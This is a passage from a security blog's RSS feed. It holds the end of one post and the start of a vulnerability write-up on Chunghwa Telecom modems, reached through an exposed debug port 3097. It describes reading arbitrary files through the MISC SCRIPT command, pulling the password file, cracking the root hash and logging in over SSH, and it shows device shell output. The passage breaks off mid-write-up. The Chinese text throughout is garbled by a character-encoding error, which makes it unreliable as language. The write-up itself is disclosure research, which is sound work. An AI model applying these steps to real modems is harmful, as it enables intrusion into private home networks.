&lt;p&gt;å…¶å¯¦ç”¢å“æœ‰æ¼æ´æ˜¯å¾ˆæ­£å¸¸ä¹Ÿå¾ˆé›£é¿å…çš„äº‹ï¼Œè€Œæˆ‘å€‘ç ”ç©¶çµ„æ˜¯ä½œç‚ºä¸€å€‹å”åŠ©è€…çš„è§’è‰²ï¼ŒæœŸæœ›èƒ½è—‰ç”±å›å ±æ¼æ´å¹«åŠ©ä¼æ¥­ï¼Œæé«˜è³‡å®‰æ„è­˜ä¸¦å¢é€²å°ç£çš„è³‡å®‰æ°´å¹³ï¼å¸Œæœ›å» å•†å€‘ä¹Ÿèƒ½ä»¥æ­£å‘çš„æ…‹åº¦ä¾†é¢å°æ¼æ´ï¼Œè€Œä¸æ˜¯é–ƒèº²é€ƒé¿ï¼Œé€™æ¨£åªæœƒä»¤ç”¨æˆ¶å€‘é™·å…¥æ›´å¤§çš„è³‡å®‰é¢¨éšªç•¶ä¸­ï¼&lt;/p&gt;

&lt;p&gt;è€Œå°æ–¼ä½¿ç”¨å„é …è¨­å‚™çš„ç”¨æˆ¶ï¼Œä¹Ÿæ‡‰ç•¶æŒæ¡å¥½å±¬æ–¼è‡ªå·±çš„è³‡ç”¢ï¼Œé˜²ç«ç‰†ã€ä¼ºæœå™¨ç­‰ç”¢å“ä¸¦ä¸æ˜¯è³¼è²·ä¾†æ¶è¨­å¥½ä»¥å¾Œå°±æ²’æœ‰å•é¡Œäº†ï¼Œåšå¥½è³‡ç”¢ç›¤é»ã€è¿½è¹¤å» å•†çš„å®‰å…¨æ€§æ›´æ–°ï¼Œæ‰èƒ½ç¢ºä¿ç”¢å“ä¸å—åˆ° 1day çš„æ”»æ“Šï¼è€Œå®šæœŸé€²è¡Œæ»²é€æ¸¬è©¦ä»¥åŠç´…éšŠæ¼”ç·´ï¼Œæ›´æ˜¯å¯ä»¥å¹«åŠ©ä¼æ¥­é‡æ¸…è‡ªå·±æ˜¯å¦æœ‰ç›²é»ã€ç¼ºå¤±ï¼Œé€²è€Œæ”¹å–„ä»¥é™ä½ä¼æ¥­è³‡å®‰é¢¨éšªã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world/</link>
                <guid>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world</guid>
                <pubDate>Mon, 23 Dec 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½ ç”¨å®ƒä¸Šç¶²ï¼Œæˆ‘ç”¨å®ƒé€²ä½ å…§ç¶²! ä¸­è¯é›»ä¿¡æ•¸æ“šæ©Ÿé ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´</title>
                <description>&lt;p&gt;å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ Orange! é€™æ¬¡çš„æ–‡ç« ï¼Œæ˜¯æˆ‘åœ¨ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; ä¸Šæ‰€åˆ†äº«çš„è­°é¡Œï¼Œè¬›è¿°å¦‚ä½•å¾ä¸­è¯é›»ä¿¡çš„ä¸€å€‹è¨­å®šç–å¤±ï¼Œåˆ°ä¸²å‡ºå¯ä»¥æŒæ§æ•¸åè¬ã€ç”šè‡³æ•¸ç™¾è¬å°çš„å®¶ç”¨æ•¸æ“šæ©Ÿæ¼æ´!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;èº«ç‚º DEVCORE çš„ç ”ç©¶åœ˜éšŠï¼Œæˆ‘å€‘çš„å·¥ä½œå°±æ˜¯ç ”ç©¶æœ€æ–°çš„æ”»æ“Šè¶¨å‹¢ã€æŒ–æ˜æœ€æ–°çš„å¼±é»ã€æ‰¾å‡ºå¯ä»¥å½±éŸ¿æ•´å€‹ä¸–ç•Œçš„æ¼æ´ï¼Œå›å ±çµ¦å» å•†é¿å…é€™äº›æ¼æ´æµè‡³åœ°ä¸‹é»‘å¸‚è¢«é»‘å¸½é§­å®¢ç”šè‡³åœ‹å®¶ç´šé§­å®¢çµ„ç¹”åˆ©ç”¨ï¼Œè®“é€™å€‹ä¸–ç•Œè®Šå¾—æ›´åŠ å®‰å…¨!&lt;/p&gt;

&lt;p&gt;æŠŠã€Œæ¼æ´ç ”ç©¶ã€ç•¶æˆå·¥ä½œï¼Œä¸€ç›´ä»¥ä¾†æ˜¯è¨±å¤šè³‡è¨Šå®‰å…¨æŠ€è¡“ç‹‚ç†±ä»½å­çš„å¤¢æƒ³ï¼Œä½†å¤§éƒ¨åˆ†çš„äººåªçœ‹åˆ°ç™¼è¡¨æ¼æ´ã€æˆ–ç«™ä¸Šç ”è¨æœƒæ™‚çš„å…‰é®®äº®éº—ï¼Œæ²’æ³¨æ„åˆ°èƒŒå¾Œæ‰€ä¸‹çš„è‹¦å·¥ï¼Œäº‹å¯¦ä¸Šï¼Œã€Œæ¼æ´ç ”ç©¶ã€å¾€å¾€æ˜¯ä¸€å€‹éå¸¸æ¨¸å¯¦ç„¡è¯ï¼Œä¸”æ¯ç‡¥çš„éç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;æ¼æ´æŒ–æ˜ä¸¦ä¸åƒ &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot;&gt;Capture the Flag (CTF)&lt;/a&gt;ï¼Œä¸€å®šå­˜åœ¨è‘—æ¼æ´ä»¥åŠä¸€å€‹æ­£ç¢ºçš„è§£æ³•ç­‰è‘—ä½ å»è§£å‡ºï¼Œåœ¨é¡Œç›®çš„é™å®šç¯„åœä¸‹ï¼Œåªè¦æ ¹æ“šç¾æœ‰çš„æ¢ä»¶ã€ç·šç´¢å»æ¨æ•²å‡ºé¡Œè€…çš„æ„åœ–ï¼Œåä¹‹å…«ä¹å¯ä»¥æ‰¾å‡ºå•é¡Œé»ã€‚ é›–ç„¶é‚„æ˜¯æœ‰é‚£ç¨®æ¸…æ–°ã€å„ªè³ªã€é›£åˆ°é åŒ—çš„æ¯”è³½ä¾‹å¦‚ &lt;a href=&quot;https://ctf.hitcon.org/&quot;&gt;HITCON CTF&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://plaidctf.com/&quot;&gt;Plaid CTF&lt;/a&gt;ï¼Œä¸é ã€Œæ‰¾å‡ºæ¼æ´ã€ èˆ‡ ã€Œå¦‚ä½•åˆ©ç”¨æ¼æ´ã€åœ¨æœ¬è³ªä¸Šå·²ç¶“æ˜¯å…©ä»¶ä¸åŒçš„äº‹æƒ…äº†!&lt;/p&gt;

&lt;p&gt;CTF å¾ˆé©åˆæœ‰ä¸€å®šç¨‹åº¦çš„äººç²¾é€²è‡ªå·±çš„èƒ½åŠ›ï¼Œä½†ç¼ºé»ä¹Ÿæ˜¯å¦‚æœç¶“å¸¸åœ¨é™åˆ¶ä½çš„å°æ¡†æ¡†å…§ï¼Œæ€è·¯åŠçœ¼ç•Œå®¹æ˜“è¢«ä¾·é™ä½ï¼ŒçœŸå¯¦ä¸–ç•Œçš„æ”»é˜²å¾€å¾€æ›´è¤‡é›œã€ç¶­åº¦ä¹Ÿæ›´å¤§! è¦åœ¨ä¸€å€‹æˆç†Ÿã€å·²ä½¿ç”¨å¤šå¹´ï¼Œä¸”å…¨ä¸–ç•Œè³‡å®‰äººå“¡éƒ½åœ¨é—œæ³¨çš„ç”¢å“ä¸ŠæŒ–æ˜å‡ºæ–°å¼±é»ï¼Œå¯æƒ³è€ŒçŸ¥çµ•å°ä¸æ˜¯ç°¡å–®çš„äº‹! ä¸€å ´ CTF ç«¶è³½é ‚å¤šä¹Ÿå°± 48 å°æ™‚ï¼Œä½†åœ¨ç„¡æ³•çŸ¥é“ç›®æ¨™æ˜¯å¦æœ‰æ¼æ´çš„å‰æä¸‹ï¼Œä½ èƒ½å …æŒå¤šä¹…?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;åœ¨æˆ‘å€‘ä¸Šä¸€å€‹ç ”ç©¶ä¸­&lt;/a&gt;ï¼Œç™¼ç¾äº†ä¸‰å€‹çŸ¥å SSL VPN å» å•†ä¸­ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´ï¼Œé›–ç„¶æˆæœè±ç¢©ï¼Œä½†ä¹Ÿæ˜¯èŠ±äº†æ•´å€‹ç ”ç©¶çµ„åŠå¹´çš„æ™‚é–“(åŠ ä¸Šå¾ŒçºŒè™•ç†ç”šè‡³å¯åˆ°ä¸€å¹´)ï¼Œç”šè‡³åœ¨å‰å…©å€‹æœˆå®Œå…¨æ˜¯é›¶ç”¢å‡ºã€æ‰¾ä¸åˆ°æ¼æ´ä¸‹æŒçºŒå®Œæˆçš„ã€‚ æ‰€ä»¥å°æ–¼ä¸€å€‹å¥½çš„æ¼æ´ç ”ç©¶äººå“¡ï¼Œé™¤äº†ç¶œåˆèƒ½åŠ›ã€è¦‹è­˜å¤šå¯¡ä»¥åŠèƒ½å¦æ·±åº¦æŒ–æ˜å¤–ï¼Œé‚„éœ€è¦å…·å‚™èƒ½å¤ ç¨ç«‹æ€è€ƒï¼Œä»¥åŠèˆˆè¶£æ¿ƒåšåˆ°è€å¾—ä½å¯‚å¯ç­‰ç­‰ç‰¹è³ªï¼Œæ‰æœ‰è¾¦æ³•åœ¨é«˜é›£åº¦çš„æŒ‘æˆ°ä¸­æ®ºå‡ºä¸€æ¢è¡€è·¯!&lt;/p&gt;

&lt;p&gt;æ¼æ´ç ”ç©¶å¾€å¾€ä¸æ˜¯ä¸€é–“å…¬å¸è³ºéŒ¢çš„é …ç›®ï¼Œå»åˆæ˜¯ç„¡æ³•ä¸æŠ•è³‡çš„éƒ¨é–€ï¼Œæœ‰å¤šå°‘å…¬å¸èƒ½å¤ å…è¨±å“¡å·¥åŠå¹´ã€ç”šè‡³ä¸€å¹´å»åšä¸€ä»¶ä¸ä¸€å®šæœ‰ç”¢å‡ºçš„ç ”ç©¶? æ›´ä½•æ³æ˜¯å°‡ç ”ç©¶æˆæœç„¡æ¢ä»¶çš„å›å ±å» å•†åªæ˜¯ç‚ºäº†è®“ä¸–ç•Œæ›´åŠ å®‰å…¨? é€™ä¹Ÿå°±æ˜¯æˆ‘å€‘ DEVCORE ä¸è«–åœ¨&lt;a href=&quot;https://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æˆ–æ˜¯&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;ä¸Šæ¯”åˆ¥äººä¾†çš„å„ªç§€çš„ç·£æ•…ï¼Œé™¤äº†å¹³æ—¥è»ç«åº«çš„ç´¯ç©å¤–ï¼Œç•¶é‡åˆ°æ¼æ´æ™‚ï¼Œä¹Ÿæœƒæƒ³ç›¡è¾¦æ³•å°‡é€™å€‹æ¼æ´çš„å±å®³æœ€å¤§åŒ–ï¼Œåˆ©ç”¨é§­å®¢æ€ç¶­ã€é€éå„ç¨®ä¸åŒçµ„åˆåˆ©ç”¨ï¼Œå°‡ä¸€å€‹ä½é¢¨éšªæ¼æ´åˆ©ç”¨åˆ°æ¥µè‡´ï¼Œé€™ä¹Ÿæ‰ç¬¦åˆçœŸå¯¦ä¸–ç•Œé§­å®¢å°ä½ çš„æ”»æ“Šæ–¹å¼!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å½±éŸ¿ç¯„åœ&quot;&gt;å½±éŸ¿ç¯„åœ&lt;/h2&gt;

&lt;p&gt;æ•…äº‹å›åˆ°ä»Šå¹´åˆçš„æŸå¤©ï¼Œæˆ‘å€‘ DEVCORE çš„æƒ…è³‡ä¸­å¿ƒç›£æ§åˆ°å…¨å°ç£æœ‰å¤§é‡çš„ç¶²è·¯åœ°å€é–‹è‘— 3097 é€£æ¥åŸ ï¼Œè€Œä¸”æœ‰è¶£çš„æ˜¯ï¼Œé€™äº›åœ°å€ä¸¦ä¸æ˜¯ä»€éº¼ä¼ºæœå™¨çš„åœ°å€ï¼Œè€Œæ˜¯æ™®é€šçš„å®¶ç”¨é›»è…¦ã€‚ ä¸€èˆ¬ä¾†èªªï¼Œå®¶ç”¨é›»è…¦é€éæ•¸æ“šæ©Ÿé€£æ¥ä¸Šç¶²éš›ç¶²è·¯ï¼Œå°å¤–çµ•ä¸æœƒé–‹æ”¾ä»»ä½•æœå‹™ï¼Œå°±ç®—æ˜¯æ•¸æ“šæ©Ÿçš„ SSH åŠ HTTP ç®¡ç†ä»‹é¢ï¼Œä¹Ÿåªæœ‰å…§éƒ¨ç¶²è·¯æ‰èƒ½è¨ªå•åˆ°ï¼Œå› æ­¤æˆ‘å€‘æ‡·ç–‘é€™èˆ‡ ISP çš„é…ç½®å¤±èª¤æœ‰é—œ! æˆ‘å€‘ä¹ŸæˆåŠŸçš„åœ¨é€™å€‹é€£æ¥åŸ ä¸ŠæŒ–æ˜å‡ºä¸€å€‹ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´! æ‰“å€‹æ¯”å–»ï¼Œå°±æ˜¯é§­å®¢å·²ç¶“ç¡åœ¨ä½ å®¶å®¢å»³æ²™ç™¼çš„æ„Ÿè¦º!&lt;/p&gt;

&lt;p&gt;é€éé€™å€‹æ¼æ´æˆ‘å€‘å¯ä»¥å®Œæˆ:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç«Šè½ç¶²è·¯æµé‡ï¼Œç«Šå–ç¶²è·¯èº«åˆ†ã€PTT å¯†ç¢¼ï¼Œç”šè‡³ä½ çš„ä¿¡ç”¨å¡è³‡æ–™&lt;/li&gt;
  &lt;li&gt;æ›´æ–°åŠ«æŒã€æ°´å‘å¼æ”»æ“Šã€å…§ç¶²ä¸­ç¹¼æ”»æ“Šå»æ§åˆ¶ä½ çš„é›»è…¦ç”šè‡³å€‹äººæ‰‹æ©Ÿ&lt;/li&gt;
  &lt;li&gt;çµåˆç´…éšŠæ¼”ç·´å»ç¹éå„ç¨®é–‹ç™¼è€…çš„ç™½åå–®æ”¿ç­–&lt;/li&gt;
  &lt;li&gt;æ›´å¤šæ›´å¤šâ€¦&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è€Œç›¸é—œçš„ CVE æ¼æ´ç·¨è™Ÿç‚º:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411&quot;&gt;CVE-2019-13411&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412&quot;&gt;CVE-2019-13412&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064&quot;&gt;CVE-2019-15064&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065&quot;&gt;CVE-2019-15065&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066&quot;&gt;CVE-2019-15066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç›¸è¼ƒæ–¼ä»¥å¾€å°å®¶ç”¨æ•¸æ“šæ©Ÿçš„æ”»æ“Šï¼Œé€™æ¬¡çš„å½±éŸ¿æ˜¯æ›´åš´é‡çš„! ä»¥å¾€å°±ç®—æ¼æ´å†åš´é‡ï¼Œåªè¦å®¶ç”¨æ•¸æ“šæ©Ÿå°å¤–ä¸é–‹æ”¾ä»»ä½•é€£æ¥åŸ ï¼Œæ”»æ“Šè€…ä¹Ÿç„¡æ³•åˆ©ç”¨ï¼Œä½†é€™æ¬¡çš„æ¼æ´åŒ…å«ä¸­è¯é›»ä¿¡çš„é…ç½®å¤±èª¤ï¼Œå°è‡´ä½ å®¶çš„æ•¸æ“šæ©Ÿåœ¨ç¶²è·¯ä¸Šè£¸å¥”ï¼Œæ”»æ“Šè€…åƒ…åƒ… &lt;strong&gt;ã€Œåªè¦çŸ¥é“ä½ çš„ IP ä¾¿å¯ä¸éœ€ä»»ä½•æ¢ä»¶ï¼Œç›´æ¥é€²å…¥ä½ å®¶å…§ç¶²ã€&lt;/strong&gt;ï¼Œè€Œä¸”ï¼Œç”±æ–¼æ²’æœ‰æ•¸æ“šæ©Ÿçš„æ§åˆ¶æ¬Šï¼Œæ‰€ä»¥é€™å€‹æ”»æ“Šä¸€èˆ¬ç”¨æˆ¶æ˜¯ç„¡æ³•é˜²ç¦¦åŠä¿®è£œçš„!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç¶“éå…¨ç¶² IPv4 çš„æƒç„ï¼Œå…¨å°ç£ç´„æœ‰ 25 è¬å°çš„æ•¸æ“šæ©Ÿå­˜åœ¨æ­¤å•é¡Œï¼Œ&lt;strong&gt;ã€Œä»£è¡¨è‡³å°‘ 25 è¬å€‹å®¶åº­å—å½±éŸ¿ã€&lt;/strong&gt;ï¼Œä¸éé€™å€‹çµæœåªåœ¨ &lt;strong&gt;ã€Œæƒæç•¶ä¸‹æœ‰é€£ä¸Šç¶²è·¯çš„æ•¸æ“šæ©Ÿæ‰è¢«ç´å…¥çµ±è¨ˆã€&lt;/strong&gt;ï¼Œæ‰€ä»¥å¯¦éš›å—å®³ç”¨æˆ¶ä¸€å®šå¤§æ–¼é€™å€‹æ•¸å­—!&lt;/p&gt;

&lt;p&gt;è€Œé€éç¶²è·¯åœ°å€çš„åæŸ¥ï¼Œæœ‰é«˜é”ä¹æˆçš„å—å®³ç”¨æˆ¶æ˜¯ä¸­è¯é›»ä¿¡çš„å‹•æ…‹ IPï¼Œè€Œå‰©ä¸‹çš„ä¸€æˆå‰‡åŒ…å«å›ºå®šåˆ¶ IP åŠå…¶ä»–é›»ä¿¡å…¬å¸ï¼Œè‡³æ–¼ç‚ºä½•æœƒæœ‰å…¶ä»–é›»ä¿¡å…¬å¸å‘¢? æˆ‘å€‘çš„ç†è§£æ˜¯ä¸­è¯é›»ä¿¡ä½œç‚ºå°ç£æœ€å¤§é›»ä¿¡å•†ï¼Œæ‰€æŒæœ‰çš„è³‡æºä»¥åŠç¡¬é«”è¨­æ–½ä¹Ÿæ˜¯å…¶ä»–é›»ä¿¡å•†é é ä¸åŠçš„ï¼Œå› æ­¤åœ¨ä¸€äº›æ¯”è¼ƒååƒ»çš„åœ°æ®µå¯èƒ½å…¶ä»–é›»ä¿¡å•†åˆ°ä½¿ç”¨è€…çš„æœ€å¾Œä¸€å“©è·¯ä¹Ÿé‚„æ˜¯ä¸­è¯é›»ä¿¡çš„è¨­å‚™! ç”±æ–¼æˆ‘å€‘ä¸æ˜¯å» å•†ï¼Œç„¡æ³•å¾—çŸ¥å®Œæ•´å—å½±éŸ¿çš„æ•¸æ“šæ©Ÿå‹è™Ÿåˆ—è¡¨ï¼Œä½†ç­†è€…ä¹Ÿæ˜¯å—å®³è€… â•®(â•¯_â•°)â•­ï¼Œæ‰€ä»¥å¯ä»¥ç¢ºå®šæœ€å¤šäººä½¿ç”¨çš„&lt;a href=&quot;https://broadband.hinet.net/rate.do&quot;&gt;ä¸­è¯é›»ä¿¡å…‰ä¸–ä»£ GPON æ•¸æ“šæ©Ÿ&lt;/a&gt; ä¹Ÿåœ¨å—å½±éŸ¿ç¯„åœå…§!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
(&lt;a href=&quot;https://www.hungry.tw/2014/12/MiWifi.html&quot;&gt;åœ–ç‰‡æ“·è‡ªç¶²è·¯&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´æŒ–æ˜&quot;&gt;æ¼æ´æŒ–æ˜&lt;/h2&gt;

&lt;p&gt;åªæ˜¯ä¸€å€‹é…ç½®å¤±èª¤ä¸¦ä¸èƒ½èªªæ˜¯ä»€éº¼å¤§å•é¡Œï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘å¸Œæœ›èƒ½åœ¨é€™å€‹æœå‹™ä¸ŠæŒ–æ˜å‡ºæ›´åš´é‡çš„æ¼æ´! è»Ÿé«”æ¼æ´çš„æŒ–æ˜ï¼Œæ ¹æ“šåŸå§‹ç¢¼ã€åŸ·è¡Œæª”ä»¥åŠ API æ–‡ä»¶çš„æœ‰ç„¡å¯ä¾åºåˆ†ç‚º:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;é»‘ç®±æ¸¬è©¦&lt;/li&gt;
  &lt;li&gt;ç°ç®±æ¸¬è©¦&lt;/li&gt;
  &lt;li&gt;ç™½ç®±æ¸¬è©¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ä»€éº¼éƒ½æ²’æœ‰çš„çš„ç‹€æ³ä¸‹ï¼Œåªèƒ½ä¾é ç¶“é©—ä»¥åŠå°ç³»çµ±çš„äº†è§£å»çŒœæ¸¬æ¯å€‹æŒ‡ä»¤èƒŒå¾Œçš„å¯¦ä½œã€ä¸¦æ‰¾å‡ºæ¼æ´ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é»‘ç®±æ¸¬è©¦&quot;&gt;é»‘ç®±æ¸¬è©¦&lt;/h3&gt;

&lt;p&gt;3097 é€£æ¥åŸ æä¾›äº†è¨±å¤šè·Ÿé›»ä¿¡ç¶²è·¯ç›¸é—œçš„æŒ‡ä»¤ï¼Œæ¨æ¸¬æ˜¯ä¸­è¯é›»ä¿¡çµ¦å·¥ç¨‹å¸«é ç«¯å°æ•¸æ“šæ©Ÿé€²è¡Œå„ç¨®ç¶²è·¯è¨­å®šçš„é™¤éŒ¯ä»‹é¢!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ï¼Œå¯ä»¥é€é &lt;code class=&quot;highlighter-rouge&quot;&gt;HELP&lt;/code&gt; æŒ‡ä»¤åˆ—å‡ºæ‰€æœ‰åŠŸèƒ½ï¼Œå…¶ä¸­æˆ‘å€‘ç™¼ç¾äº†ä¸€å€‹æŒ‡ä»¤å«åš &lt;code class=&quot;highlighter-rouge&quot;&gt;MISC&lt;/code&gt; ï¼Œçœ‹åå­—æ„Ÿè¦ºå°±æ˜¯æŠŠä¸€å †ä¸çŸ¥é“æ€éº¼åˆ†é¡çš„æŒ‡ä»¤æ­¸é¡åœ¨é€™ï¼Œè€Œå…¶ä¸­ä¸€å€‹å«åš &lt;code class=&quot;highlighter-rouge&quot;&gt;SCRIPT&lt;/code&gt; å¸å¼•äº†æˆ‘å€‘! å®ƒçš„åƒæ•¸ç‚ºä¸€å€‹æª”æ¡ˆåç¨±ï¼ŒåŸ·è¡Œå¾Œåƒæ˜¯æœƒæŠŠæª”æ¡ˆç•¶æˆ Shell Script ä¾†åŸ·è¡Œï¼Œä½†åœ¨ç„¡æ³•åœ¨é ç«¯æ©Ÿå™¨ç•™ä¸‹ä¸€å€‹å¯æ§æª”æ¡ˆçš„å‰æä¸‹ï¼Œä¹Ÿç„¡æ³•é€éé€™å€‹æŒ‡ä»¤å–å¾—ä»»æ„ä»£ç¢¼åŸ·è¡Œã€‚ ä¸éæœ‰è¶£çš„æ˜¯ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;MISC SCRIPT&lt;/code&gt; é€™å€‹æŒ‡ä»¤æœƒå°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; çµ¦é¡¯ç¤ºå‡ºä¾†ï¼Œå› æ­¤å¯ä»¥é€éé€™å€‹ç‰¹æ€§å»å®Œæˆä»»æ„æª”æ¡ˆè®€å–!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾é»‘ç®±é€²åŒ–æˆç°ç®±&quot;&gt;å¾é»‘ç®±é€²åŒ–æˆç°ç®±&lt;/h3&gt;

&lt;p&gt;åœ¨æ¼æ´çš„åˆ©ç”¨ä¸Šï¼Œç„¡è«–æ˜¯è¨˜æ†¶é«”çš„åˆ©ç”¨ã€æˆ–æ˜¯ç¶²è·¯çš„æ»²é€ï¼Œä¸å¤–ä¹éƒ½åœç¹è‘—å°ç›®æ¨™çš„è®€(Read)ã€ å¯«(Write) ä»¥åŠä»£ç¢¼åŸ·è¡Œ(eXecute) ä¸‰å€‹æ¬Šé™çš„å–å¾—ï¼Œç¾åœ¨æˆ‘å€‘å–å¾—äº†ç¬¬ä¸€å€‹è®€çš„æ¬Šé™ï¼Œæ¥ä¸‹ä¾†å‘¢?&lt;/p&gt;

&lt;p&gt;é™¤éŒ¯ä»‹é¢è²Œä¼¼è·‘åœ¨é«˜æ¬Šé™ä½¿ç”¨è€…ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€éè®€å–ç³»çµ±å¯†ç¢¼æª”å¾—åˆ°ç³»çµ±ä½¿ç”¨è€…ç®¡ç†ç™»å…¥çš„å¯†ç¢¼é›œæ¹Š!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€éå° &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; ä½¿ç”¨è€…å¯†ç¢¼é›œæ¹Šçš„ç ´è§£ï¼Œæˆ‘å€‘æˆåŠŸçš„ç™»å…¥æ•¸æ“šæ©Ÿ SSH å°‡ã€Œé»‘ç®±ã€è½‰åŒ–æˆã€Œç°ç®±ã€! é›–ç„¶ç¾åœ¨å¯ä»¥æˆåŠŸæ§åˆ¶è‡ªå·±çš„æ•¸æ“šæ©Ÿï¼Œä½†ä¸€èˆ¬å®¶ç”¨æ•¸æ“šæ©Ÿå°å¤–æ˜¯ä¸æœƒé–‹æ”¾ SSH æœå‹™çš„ï¼Œç‚ºäº†é”åˆ°å¯ä»¥ã€Œé ç«¯ã€æ§åˆ¶åˆ¥äººçš„æ•¸æ“šæ©Ÿï¼Œæˆ‘å€‘é‚„æ˜¯å¾—æƒ³è¾¦æ³•å¾ 3097 é€™å€‹æœå‹™æ‹¿åˆ°ä»£ç¢¼çš„åŸ·è¡Œæ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ•´å€‹ä¸­è¯é›»ä¿¡çš„æ•¸æ“šæ©Ÿæ˜¯ä¸€å€‹è·‘åœ¨ MIPS è™•ç†å™¨æ¶æ§‹ä¸Šçš„åµŒå…¥å¼ Linux ç³»çµ±ï¼Œè€Œ 3097 æœå‹™å‰‡æ˜¯ç”±ä¸€å€‹åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/omcimain&lt;/code&gt; çš„äºŒé€²ä½æª”æ¡ˆä¾†è™•ç†ï¼Œæ•´å€‹æª”æ¡ˆå¤§å°æœ‰å°‡è¿‘ 5MBï¼Œå°é€†å‘å·¥ç¨‹ä¾†èªªä¸¦ä¸æ˜¯ä¸€å€‹å°æ•¸ç›®ï¼Œä½†èˆ‡é»‘ç®±æ¸¬è©¦ç›¸è¼ƒä¹‹ä¸‹ï¼Œè‡³å°‘æœ‰äº†æ±è¥¿å¯ä»¥åˆ†æäº†çœŸæ£’!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾ç°ç®±é€²åŒ–æˆç™½ç®±&quot;&gt;å¾ç°ç®±é€²åŒ–æˆç™½ç®±&lt;/h3&gt;

